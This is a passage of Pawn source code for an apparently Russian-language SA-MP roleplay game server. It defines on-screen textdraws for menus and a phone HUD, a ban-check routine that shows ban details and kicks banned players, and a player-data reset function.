	PlayerTextDrawAlignment(playerid, PlayerMenu[playerid][0], 1);
	PlayerTextDrawColor(playerid, PlayerMenu[playerid][0], 0);
	PlayerTextDrawUseBox(playerid, PlayerMenu[playerid][0], true);
	PlayerTextDrawBoxColor(playerid, PlayerMenu[playerid][0], 102);
	PlayerTextDrawSetShadow(playerid, PlayerMenu[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, PlayerMenu[playerid][0], 0);
	PlayerTextDrawFont(playerid, PlayerMenu[playerid][0], 0);

	PlayerMenu[playerid][1] = CreatePlayerTextDraw(playerid, 440.541717, 180.833343, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, PlayerMenu[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PlayerMenu[playerid][1], 148.521270, 14.583312);
	PlayerTextDrawAlignment(playerid, PlayerMenu[playerid][1], 1);
	PlayerTextDrawColor(playerid, PlayerMenu[playerid][1], -1061109505);
	PlayerTextDrawSetShadow(playerid, PlayerMenu[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, PlayerMenu[playerid][1], 0);
	PlayerTextDrawFont(playerid, PlayerMenu[playerid][1], 4);

	PlayerMenu[playerid][2] = CreatePlayerTextDraw(playerid, 516.442382, 181.416763, "њ‚POBOE –Eм”");
	PlayerTextDrawLetterSize(playerid, PlayerMenu[playerid][2], 0.265871, 1.244166);
	PlayerTextDrawAlignment(playerid, PlayerMenu[playerid][2], 2);
	PlayerTextDrawColor(playerid, PlayerMenu[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, PlayerMenu[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, PlayerMenu[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, PlayerMenu[playerid][2], 51);
	PlayerTextDrawFont(playerid, PlayerMenu[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, PlayerMenu[playerid][2], 1);

	PlayerMenu[playerid][3] = CreatePlayerTextDraw(playerid, 526.281066, 289.333221, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, PlayerMenu[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PlayerMenu[playerid][3], 60.000000, 16.916673);
	PlayerTextDrawAlignment(playerid, PlayerMenu[playerid][3], 1);
	PlayerTextDrawColor(playerid, PlayerMenu[playerid][3], 255);
	PlayerTextDrawSetShadow(playerid, PlayerMenu[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, PlayerMenu[playerid][3], 0);
	PlayerTextDrawFont(playerid, PlayerMenu[playerid][3], 4);
	PlayerTextDrawSetSelectable(playerid, PlayerMenu[playerid][3], true);

	PlayerMenu[playerid][4] = CreatePlayerTextDraw(playerid, 538.463134, 293.416656, "џAKP‘Џ’");
	PlayerTextDrawLetterSize(playerid, PlayerMenu[playerid][4], 0.200000, 0.699999);
	PlayerTextDrawAlignment(playerid, PlayerMenu[playerid][4], 1);
	PlayerTextDrawColor(playerid, PlayerMenu[playerid][4], -1061109505);
	PlayerTextDrawSetShadow(playerid, PlayerMenu[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, PlayerMenu[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, PlayerMenu[playerid][4], 51);
	PlayerTextDrawFont(playerid, PlayerMenu[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, PlayerMenu[playerid][4], 1);


	PlayerMenu[playerid][5] = CreatePlayerTextDraw(playerid, 442.884185, 289.333282, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, PlayerMenu[playerid][5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PlayerMenu[playerid][5], 60.000000, 16.916673);
	PlayerTextDrawAlignment(playerid, PlayerMenu[playerid][5], 1);
	PlayerTextDrawColor(playerid, PlayerMenu[playerid][5], 255);
	PlayerTextDrawSetShadow(playerid, PlayerMenu[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, PlayerMenu[playerid][5], 0);
	PlayerTextDrawFont(playerid, PlayerMenu[playerid][5], 4);
	PlayerTextDrawSetSelectable(playerid, PlayerMenu[playerid][5], true);

	PlayerMenu[playerid][6] = CreatePlayerTextDraw(playerid, 472.869750, 293.416656, "љA‡EE");
	PlayerTextDrawLetterSize(playerid, PlayerMenu[playerid][6], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, PlayerMenu[playerid][6], 2);
	PlayerTextDrawColor(playerid, PlayerMenu[playerid][6], -1061109505);
	PlayerTextDrawSetShadow(playerid, PlayerMenu[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, PlayerMenu[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, PlayerMenu[playerid][6], 51);
	PlayerTextDrawFont(playerid, PlayerMenu[playerid][6], 2);
	PlayerTextDrawSetProportional(playerid, PlayerMenu[playerid][6], 1);

	NameDialog[playerid][0] = CreatePlayerTextDraw(playerid, 472.869750, 203.583328, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][0], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][0], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][0], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][0], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][0], 1);

	NameDialog[playerid][1] = CreatePlayerTextDraw(playerid, 472.869750, 221.083343, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][1], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][1], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][1], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][1], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][1], 1);

	NameDialog[playerid][2] = CreatePlayerTextDraw(playerid, 472.869750, 239.166641, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][2], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][2], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][2], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][2], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][2], 1);

	NameDialog[playerid][3] = CreatePlayerTextDraw(playerid, 472.869750, 257.250000, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][3], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][3], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][3], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][3], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][3], 1);

	NameDialog[playerid][4] = CreatePlayerTextDraw(playerid, 472.869750, 275.333923, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][4], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][4], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][4], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][4], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][4], 1);

	NameDialog[playerid][5] = CreatePlayerTextDraw(playerid, 472.869750, 294.583343, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][5], 0.180000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][5], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][5], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][5], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][5], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][5], 1);

	NameDialog[playerid][6] = CreatePlayerTextDraw(playerid, 555.798339, 203.583328, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][6], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][6], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][6], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][6], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][6], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][6], 1);

	NameDialog[playerid][7] = CreatePlayerTextDraw(playerid, 555.798339, 221.666641, "");
    PlayerTextDrawLetterSize(playerid, NameDialog[playerid][7], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][7], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][7], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][7], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][7], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][7], 1);

	NameDialog[playerid][8] = CreatePlayerTextDraw(playerid, 555.798339, 239.750000, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][8], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][8], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][8], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][8], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][8], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][8], 1);

	NameDialog[playerid][9] = CreatePlayerTextDraw(playerid, 555.798339, 257.833282, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][9], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][9], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][9], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][9], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][9], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][9], 1);

	NameDialog[playerid][10] = CreatePlayerTextDraw(playerid, 555.798339, 276.500122, "");
	PlayerTextDrawLetterSize(playerid, NameDialog[playerid][10], 0.200000, 0.699998);
	PlayerTextDrawAlignment(playerid, NameDialog[playerid][10], 2);
	PlayerTextDrawColor(playerid, NameDialog[playerid][10], -1061109505);
	PlayerTextDrawSetShadow(playerid, NameDialog[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, NameDialog[playerid][10], 0);
	PlayerTextDrawBackgroundColor(playerid, NameDialog[playerid][10], 51);
	PlayerTextDrawFont(playerid, NameDialog[playerid][10], 2);
	PlayerTextDrawSetProportional(playerid, NameDialog[playerid][10], 1);

	TextDialog[playerid][0] = CreatePlayerTextDraw(playerid, 514.099792, 198.000000, "-");
	PlayerTextDrawLetterSize(playerid, TextDialog[playerid][0], 0.200000, 0.699999);
	PlayerTextDrawAlignment(playerid, TextDialog[playerid][0], 2);
	PlayerTextDrawColor(playerid, TextDialog[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, TextDialog[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, TextDialog[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, TextDialog[playerid][0], 51);
	PlayerTextDrawFont(playerid, TextDialog[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, TextDialog[playerid][0], 1);

	TextDialog[playerid][1] = CreatePlayerTextDraw(playerid, 514.099792, 205.000000, "-");
	PlayerTextDrawLetterSize(playerid, TextDialog[playerid][1], 0.200000, 0.699999);
	PlayerTextDrawAlignment(playerid, TextDialog[playerid][1], 2);
	PlayerTextDrawColor(playerid, TextDialog[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, TextDialog[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, TextDialog[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, TextDialog[playerid][1], 51);
	PlayerTextDrawFont(playerid, TextDialog[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, TextDialog[playerid][1], 1);

	TextDialog[playerid][2] = CreatePlayerTextDraw(playerid, 514.099792, 212.000000, "-");
	PlayerTextDrawLetterSize(playerid, TextDialog[playerid][2], 0.200000, 0.699999);
	PlayerTextDrawAlignment(playerid, TextDialog[playerid][2], 2);
	PlayerTextDrawColor(playerid, TextDialog[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, TextDialog[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, TextDialog[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, TextDialog[playerid][2], 51);
	PlayerTextDrawFont(playerid, TextDialog[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, TextDialog[playerid][2], 1);

	TextDialog[playerid][3] = CreatePlayerTextDraw(playerid, 514.099792, 219.000000, "-");
	PlayerTextDrawLetterSize(playerid, TextDialog[playerid][3], 0.200000, 0.699999);
	PlayerTextDrawAlignment(playerid, TextDialog[playerid][3], 2);
	PlayerTextDrawColor(playerid, TextDialog[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, TextDialog[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, TextDialog[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, TextDialog[playerid][3], 51);
	PlayerTextDrawFont(playerid, TextDialog[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, TextDialog[playerid][3], 1);

	TextDialog[playerid][4] = CreatePlayerTextDraw(playerid, 514.099792, 226.000000, "-");
	PlayerTextDrawLetterSize(playerid, TextDialog[playerid][4], 0.200000, 0.699999);
	PlayerTextDrawAlignment(playerid, TextDialog[playerid][4], 2);
	PlayerTextDrawColor(playerid, TextDialog[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, TextDialog[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, TextDialog[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, TextDialog[playerid][4], 51);
	PlayerTextDrawFont(playerid, TextDialog[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, TextDialog[playerid][4], 1);

    //
	VehNazv[playerid] = CreatePlayerTextDraw(playerid,450.0,205.0, " ");
	PlayerTextDrawBackgroundColor(playerid,VehNazv[playerid], COLOR_BLACK);
	PlayerTextDrawLetterSize(playerid,VehNazv[playerid],0.399999,1.710000);
	PlayerTextDrawFont(playerid,VehNazv[playerid], 2);
	PlayerTextDrawColor(playerid,VehNazv[playerid], -1);
	PlayerTextDrawSetOutline(playerid,VehNazv[playerid], 1);
	PlayerTextDrawSetProportional(playerid,VehNazv[playerid],1);
	PlayerTextDrawSetShadow(playerid,VehNazv[playerid],1);

	VehCost[playerid] = CreatePlayerTextDraw(playerid,450.0,225.0, " ");
	PlayerTextDrawBackgroundColor(playerid,VehCost[playerid], COLOR_BLACK);
	PlayerTextDrawLetterSize(playerid,VehCost[playerid],0.399999,1.710000);
	PlayerTextDrawFont(playerid,VehCost[playerid], 2);
	PlayerTextDrawColor(playerid,VehCost[playerid], -1);
	PlayerTextDrawSetOutline(playerid,VehCost[playerid], 1);
	PlayerTextDrawSetProportional(playerid,VehCost[playerid],1);
	PlayerTextDrawSetShadow(playerid,VehCost[playerid],1);

	SelSkin[playerid] = CreatePlayerTextDraw(playerid,57.150001, 267.750061, "300");
	PlayerTextDrawLetterSize(playerid, SelSkin[playerid], 0.181898, 1.056625);
	PlayerTextDrawAlignment(playerid, SelSkin[playerid], 1);
	PlayerTextDrawColor(playerid, SelSkin[playerid], 255);
	PlayerTextDrawSetShadow(playerid, SelSkin[playerid], 0);
	PlayerTextDrawSetOutline(playerid, SelSkin[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, SelSkin[playerid], 51);
	PlayerTextDrawFont(playerid, SelSkin[playerid], 2);
	PlayerTextDrawSetProportional(playerid, SelSkin[playerid], 1);

	JRP_TD[playerid][0] = CreatePlayerTextDraw(playerid, 575.332946, 187.496307, "10000000 ~y~~h~RUB");
	PlayerTextDrawLetterSize(playerid, JRP_TD[playerid][0], 0.220999, 1.259852);
	PlayerTextDrawAlignment(playerid, JRP_TD[playerid][0], 2);
	PlayerTextDrawColor(playerid, JRP_TD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, JRP_TD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, JRP_TD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, JRP_TD[playerid][0], 51);
	PlayerTextDrawFont(playerid, JRP_TD[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, JRP_TD[playerid][0], 1);

	JRP_TD[playerid][1] = CreatePlayerTextDraw(playerid, 574.666687, 212.800048, "toyota MARK II");
	PlayerTextDrawLetterSize(playerid, JRP_TD[playerid][1], 0.158665, 0.865777);
	PlayerTextDrawAlignment(playerid, JRP_TD[playerid][1], 2);
	PlayerTextDrawColor(playerid, JRP_TD[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, JRP_TD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, JRP_TD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, JRP_TD[playerid][1], 51);
	PlayerTextDrawFont(playerid, JRP_TD[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, JRP_TD[playerid][1], 1);

	PhonesSA[playerid][0] = CreatePlayerTextDraw(playerid, 543.375000, 180.666656, "");//time
	PlayerTextDrawLetterSize(playerid, PhonesSA[playerid][0], 0.199999, 0.835833);
	PlayerTextDrawAlignment(playerid, PhonesSA[playerid][0], 1);
	PlayerTextDrawColor(playerid, PhonesSA[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, PhonesSA[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, PhonesSA[playerid][0], 1);
	PlayerTextDrawBackgroundColor(playerid, PhonesSA[playerid][0], 51);
	PlayerTextDrawFont(playerid, PhonesSA[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid, PhonesSA[playerid][0], 1);

	PhonesSA[playerid][1] = CreatePlayerTextDraw(playerid, 507.625000, 185.666671, "usebox");
	PlayerTextDrawLetterSize(playerid, PhonesSA[playerid][1], 0.000000, 0.007406);
	PlayerTextDrawTextSize(playerid, PhonesSA[playerid][1], 500.500000, 0.000000);
	PlayerTextDrawAlignment(playerid, PhonesSA[playerid][1], 1);
	PlayerTextDrawColor(playerid, PhonesSA[playerid][1], 0);
	PlayerTextDrawUseBox(playerid, PhonesSA[playerid][1], true);
	PlayerTextDrawBoxColor(playerid, PhonesSA[playerid][1], 0xffffffff);//16711935
	PlayerTextDrawSetShadow(playerid, PhonesSA[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, PhonesSA[playerid][1], 0);
	PlayerTextDrawFont(playerid, PhonesSA[playerid][1], 0);

	PhonesSA[playerid][2] = CreatePlayerTextDraw(playerid, 514.375000, 180.666656, "3G");
	PlayerTextDrawLetterSize(playerid, PhonesSA[playerid][2], 0.199999, 0.835833);
	PlayerTextDrawAlignment(playerid, PhonesSA[playerid][2], 1);
	PlayerTextDrawColor(playerid, PhonesSA[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, PhonesSA[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, PhonesSA[playerid][2], 1);
	PlayerTextDrawBackgroundColor(playerid, PhonesSA[playerid][2], 51);
	PlayerTextDrawFont(playerid, PhonesSA[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, PhonesSA[playerid][2], 1);
	//
	StatusWork[playerid][0] = CreatePlayerTextDraw(playerid, 609.500000, 143.687500, " ");
	PlayerTextDrawLetterSize(playerid, StatusWork[playerid][0], 0.000000, 0.016666);
	PlayerTextDrawTextSize(playerid, StatusWork[playerid][0], 0.500000, 0.000000);
	PlayerTextDrawAlignment(playerid, StatusWork[playerid][0], 0);
	PlayerTextDrawColor(playerid, StatusWork[playerid][0], 0);
	PlayerTextDrawUseBox(playerid, StatusWork[playerid][0], true);
	PlayerTextDrawBoxColor(playerid, StatusWork[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, StatusWork[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, StatusWork[playerid][0], 0);
	PlayerTextDrawFont(playerid, StatusWork[playerid][0], 0);

	StatusWork[playerid][1] = CreatePlayerTextDraw(playerid, 256.749633, 383.500000, "LD_SPAC:white");//353
	PlayerTextDrawLetterSize(playerid, StatusWork[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, StatusWork[playerid][1], 123.689575, 28.583312);
	PlayerTextDrawAlignment(playerid, StatusWork[playerid][1], 1);
	PlayerTextDrawColor(playerid, StatusWork[playerid][1], 10066431);
	PlayerTextDrawSetShadow(playerid, StatusWork[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, StatusWork[playerid][1], 0);
	PlayerTextDrawFont(playerid, StatusWork[playerid][1], 4);

	StatusWork[playerid][2] = CreatePlayerTextDraw(playerid, 379.628143, 386.750000, "usebox");
	PlayerTextDrawLetterSize(playerid, StatusWork[playerid][2], 0.000000, 2.315739);
	PlayerTextDrawTextSize(playerid, StatusWork[playerid][2], 256.623718, 0.000000);
	PlayerTextDrawAlignment(playerid, StatusWork[playerid][2], 1);
	PlayerTextDrawColor(playerid, StatusWork[playerid][2], 0);
	PlayerTextDrawUseBox(playerid, StatusWork[playerid][2], true);
	PlayerTextDrawBoxColor(playerid, StatusWork[playerid][2], 102);
	PlayerTextDrawSetShadow(playerid, StatusWork[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, StatusWork[playerid][2], 0);
	PlayerTextDrawFont(playerid, StatusWork[playerid][2], 0);

	StatusWork[playerid][3] = CreatePlayerTextDraw(playerid, 495.999908, 191.893264, "");
	PlayerTextDrawLetterSize(playerid, StatusWork[playerid][3], 0.383599, 1.652266);
	PlayerTextDrawAlignment(playerid, StatusWork[playerid][3], 1);
	PlayerTextDrawColor(playerid, StatusWork[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, StatusWork[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, StatusWork[playerid][3], 1);
	PlayerTextDrawBackgroundColor(playerid, StatusWork[playerid][3], 51);
	PlayerTextDrawFont(playerid, StatusWork[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, StatusWork[playerid][3], 1);

	StatusWork[playerid][4] = CreatePlayerTextDraw(playerid, 271.273529, 386.416717, "ПPИНEСEНО: 0");
	PlayerTextDrawLetterSize(playerid, StatusWork[playerid][4], 0.208710, 1.209166);
	PlayerTextDrawAlignment(playerid, StatusWork[playerid][4], 1);
	PlayerTextDrawColor(playerid, StatusWork[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, StatusWork[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, StatusWork[playerid][4], 1);
	PlayerTextDrawBackgroundColor(playerid, StatusWork[playerid][4], 51);
	PlayerTextDrawFont(playerid, StatusWork[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, StatusWork[playerid][4], 1);

	StatusWork[playerid][5] = CreatePlayerTextDraw(playerid, 270.805328, 396.916564, "ПРOЦEНТ: 0 %");
	PlayerTextDrawLetterSize(playerid, StatusWork[playerid][5], 0.210585, 1.086665);
	PlayerTextDrawAlignment(playerid, StatusWork[playerid][5], 1);
	PlayerTextDrawColor(playerid, StatusWork[playerid][5], -1);
	PlayerTextDrawSetShadow(playerid, StatusWork[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, StatusWork[playerid][5], 1);
	PlayerTextDrawBackgroundColor(playerid, StatusWork[playerid][5], 51);
	PlayerTextDrawFont(playerid, StatusWork[playerid][5], 2);
	PlayerTextDrawSetProportional(playerid, StatusWork[playerid][5], 1);
 	//

}

stock RemoveBuild(playerid)
{
	#include "../include/cromulent/Remove"
}

forward check_banlist(playerid);
public check_banlist(playerid)
{
	new rows, fields;
	new unbandate, ban_type, vas[32], bool:ban, dialog[600], str[200];
	cache_get_data(rows, fields);
	if(rows)
	{
	    cache_get_field_content(0, "unbandate", vas); unbandate = strval(vas);
		if(unbandate - gettime() > 0) ban = true;
		ban_type = cache_get_field_content_int(0, "ban_type");
	}
	if(ban == true)
	{
		new data[15], whobanned[MAX_PLAYER_NAME], reason[32], timeban;
		cache_get_field_content(0, "bandate", data);
		cache_get_field_content(0, "unbandate", vas); unbandate = strval(vas);
		cache_get_field_content(0, "whobanned", whobanned);
		cache_get_field_content(0, "reason", reason);
		timeban = cache_get_field_content_int(0, "time");

       	if(ban_type == 0)
       	{
	       	strcat(dialog, "{FFFFFF}");
	       	format(str, sizeof(str), "Ваш игровой ник: %s\n", GetName(playerid));
			strcat(dialog, str);
			format(str, sizeof(str), "Заблокировал: %s\n", whobanned);
			strcat(dialog, str);
	  		format(str, sizeof(str), "Дата блокировки: %s\n", data);
			strcat(dialog, str);
			format(str, sizeof(str), "Срок блокировки: %d дней\n", timeban);
			strcat(dialog, str);
			format(str, sizeof(str), "Аккаунт будет разблокирован: %s\n", date("%dd.%mm.%yyyy в %hh:%ii:%ss",unbandate));
			strcat(dialog, str);
			format(str, sizeof(str), "Причина блокировки: %s", reason);
		 	strcat(dialog, str);

			ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{F33106}Временная блокировка", dialog, "Закрыть", "");
			KickExx(playerid, "", 5000);
		}
		if(ban_type == 1)
		{
		    strcat(dialog, "{FFFFFF}");
		    strcat(dialog, "К сожалению, Вы получили бессрочную блокировку на сервере\n");
		    strcat(dialog, "Это значит, что Вы больше никогда не будете иметь доступа к серверу\n");
		    strcat(dialog, "Если Вы считаете, что Ваш аккаунт был заблокирован по ошибке - Вы можете обжаловать это\n\n");
		    format(str, sizeof(str), "Ваш игровой ник: %s\n", GetName(playerid));
			strcat(dialog, str);
			format(str, sizeof(str), "Заблокировал: %s\n", whobanned);
			strcat(dialog, str);
	  		format(str, sizeof(str), "Дата блокировки: %s\n", data);
			strcat(dialog, str);
			format(str, sizeof(str), "Причина блокировки: %s", reason);
		 	strcat(dialog, str);

			ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{F33106}Бессрочная блокировка", dialog, "Закрыть", "");
			KickExx(playerid, "", 5000);
		}
	}

	return 1;
}

stock KickExx(playerid, message[] = #KICK_MESSAGE, time=200)
{
	if(strlen(message) > 0)
		SendClientMessage(playerid, -1, message);

	return SetTimerEx("PlayerKick", time, false, "i", playerid);
}
forward PlayerKick(playerid);
public PlayerKick(playerid)
{
	return SKick(playerid, 28183);
}
stock SetPlayerDataToDefault(playerid)
{
    SetPVarInt(playerid, "USEDIALOGID", -1);
	SetPVarInt(playerid, "arendkey", -1);

	proposition_info[playerid] = g_proposition_default_values;

	for(new idx; idx < MAX_BOTTLES; idx ++) g_bottles_object[playerid][idx] = INVALID_OBJECT_ID;

	for(new i = 0; i < 8; i++) Shot[playerid][i] = 0;

	PI[playerid][pMaxBottles]						= 10;

	PI[playerid][P_PB_TEAM]							= -1;

	PI[playerid][P_LISTETING]						=
	PI[playerid][P_ENTRANCE] 						=
	PI[playerid][P_ROOM] 							= -1;

	PI[playerid][P_TUNING_STATE]					= 1;

	ClearSettingPlayer(playerid);

	PI[playerid][P_JOB]								=
	PI[playerid][P_GNEWS]							=
	PI[playerid][P_LOAD_JOB]						=
	PI[playerid][P_FAMILY]							=
	PI[playerid][P_FAMILY_COLOR]					=
	PI[playerid][P_MENU_COLOR]						=
	TransferReset[playerid] 						=
	PI[playerid][P_BOMB]							=
    player_hour_time[playerid]                      =
    admin_attempt[playerid]                         =
	admin_ban_time[playerid]                        =
	admin_check_time[playerid]                      =
    PI[playerid][pCity]                         	=
    PI[playerid][pBusTime]                          =
    PI[playerid][pWorkSalary]                       =
    WeaponTime[playerid] 							=
    RapidFire[playerid] 							=
    PI[playerid][pAFK]                              =
	AdminInfo[playerid][admAlog]                    =
    AdminInfo[playerid][admGoto]                    =
    AdminInfo[playerid][admGethere]                 =
    AdminInfo[playerid][admSpectate]                =
    Ujahhs[playerid] 								=
    Medicines[playerid]								=
    UnMaskReset[playerid] 							=
	PlayerBrake[playerid] 							=
    AC_Air_Time[playerid] 							=
    AC_Air_Time_Car[playerid] 						=
	pickupentered[playerid] 						=
